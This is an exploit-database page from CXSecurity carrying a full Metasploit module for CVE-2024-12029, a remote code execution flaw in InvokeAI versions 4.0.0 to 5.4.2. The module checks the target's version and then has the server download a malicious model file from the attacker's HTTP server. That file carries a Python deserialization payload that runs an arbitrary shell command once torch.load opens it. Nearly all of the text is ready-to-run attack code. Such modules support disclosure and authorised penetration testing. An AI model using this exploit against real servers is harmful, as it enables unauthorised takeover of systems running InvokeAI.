---
title: InvokeAI Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025020011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-02-20
fetch_date: 2025-10-06T20:32:52.335649
---

# InvokeAI Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **InvokeAI Remote Code Execution** **2025.02.19**  Credit:  **[Takahiro Yokoyama](https://cxsecurity.com/author/Takahiro%2BYokoyama/1/)**  Risk: **High**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HttpServer
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'InvokeAI RCE',
'Description' => %q{
InvokeAI has a critical vulnerability leading to remote code execution in the /api/v2/models/install API through unsafe model deserialization.
The API allows users to specify a model URL, which is downloaded and loaded server-side using torch.load without proper validation.
This functionality allows attackers to embed malicious code in model files that execute upon loading.
},
'Author' => [
'jackfromeast', # Vulnerability discovery and PoC
'Takahiro Yokoyama' # Metasploit module
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2024-12029'],
['URL', 'https://huntr.com/bounties/9b790f94-1b1b-4071-bc27-78445d1a87a3'],
],
'Platform' => %w[linux],
'Targets' => [
[
'Linux Command', {
'Arch' => [ ARCH\_CMD ], 'Platform' => [ 'unix', 'linux' ], 'Type' => :nix\_cmd
}
],
],
'DefaultOptions' => {
'FETCH\_DELETE' => true
},
'DefaultTarget' => 0,
'Payload' => {
'BadChars' => '\'"'
},
'Stance' => Msf::Exploit::Stance::Aggressive,
'DisclosureDate' => '2025-02-07',
'Notes' => {
'Stability' => [ CRASH\_SAFE, ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ],
'Reliability' => [ REPEATABLE\_SESSION, ]
}
)
)
register\_options(
[
Opt::RPORT(9090),
]
)
register\_advanced\_options([
OptPort.new('SRVPORT', [true, 'The local port to listen HTTP requests from target', 8081 ]),
OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 10])
])
end
def check
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'api/v1/app/version')
})
return Exploit::CheckCode::Unknown unless res&.code == 200
json\_version = res&.get\_json\_document&.fetch('version', nil)
return Exploit::CheckCode::Unknown('Failed to parse version.') unless json\_version
version = Rex::Version.new(json\_version)
return Exploit::CheckCode::Unknown('Failed to get version.') unless version
return Exploit::CheckCode::Safe("Version #{version} detected, which is not vulnerable.") unless version.between?(Rex::Version.new('4.0.0'), Rex::Version.new('5.4.2'))
Exploit::CheckCode::Appears("Version #{version} detected.")
end
def on\_request\_uri(cli, \_request)
send\_response(cli, Msf::Util::PythonDeserialization.payload(:py3\_exec\_threaded, "import os;os.system('#{payload.encoded}')"))
end
def primer
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'api/v2/models/install'),
'headers' => { 'Content-Type' => 'application/json' },
'vars\_get' => {
# Malicious model path, not .pkl
'source' => "#{get\_uri}/#{rand\_text\_alpha(8)}.ckpt",
'inplace' => 'true'
},
'data' => {}.to\_json
})
fail\_with(Failure::Unknown, 'Unexpected server reply.') unless res&.code == 201
end
def exploit
Timeout.timeout(datastore['HTTPDELAY']) { super }
rescue Timeout::Error
# When the server stops due to our timeout, this is raised
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025020011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top